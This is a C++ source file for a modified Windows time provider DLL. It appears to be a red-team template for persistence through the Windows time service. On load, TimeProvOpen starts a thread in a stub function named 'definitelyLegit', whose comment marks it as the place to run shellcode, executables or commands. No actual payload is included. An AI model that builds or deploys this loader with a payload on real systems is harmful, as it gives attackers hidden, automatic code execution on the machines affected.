#include <Windows.h>
#include "timeprov.h"

/*
 * Based on the Sample Time Provider DLL sourcecode from Microsoft
 * https://learn.microsoft.com/en-us/windows/win32/sysinfo/sample-time-provider
 */

TimeProvSysCallbacks sc;
const TimeProvHandle htp1 = (TimeProvHandle)1;

TpcGetSamplesArgs Samples;
DWORD dwPollInterval;

void definitelyLegit() {
    // execute shellcode, executables, commands ...
}

HRESULT CALLBACK TimeProvOpen(WCHAR* wszName, TimeProvSysCallbacks* pSysCallback, TimeProvHandle* phTimeProv) {
    CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) definitelyLegit, nullptr, 0, nullptr);

    // Copy the system callback pointers to a buffer.
    CopyMemory(&sc, (PVOID)pSysCallback, sizeof(TimeProvSysCallbacks));
    *phTimeProv = htp1;

    return S_OK;
}

HRESULT CALLBACK TimeProvCommand(TimeProvHandle hTimeProv, TimeProvCmd eCmd, PVOID pvArgs) {
    switch(eCmd) {
        case TPC_GetSamples:
            CopyMemory(pvArgs, &Samples, sizeof(TpcGetSamplesArgs));
        break;
        case TPC_PollIntervalChanged:
            sc.pfnGetTimeSysInfo( TSI_PollInterval, &dwPollInterval );
        break;
        case TPC_TimeJumped:
            ZeroMemory(&Samples, sizeof(TpcGetSamplesArgs));
        break;
        case TPC_UpdateConfig:
            break;
    }
    return S_OK;
}

HRESULT CALLBACK TimeProvClose(TimeProvHandle hTimeProv) {
    return S_OK;
}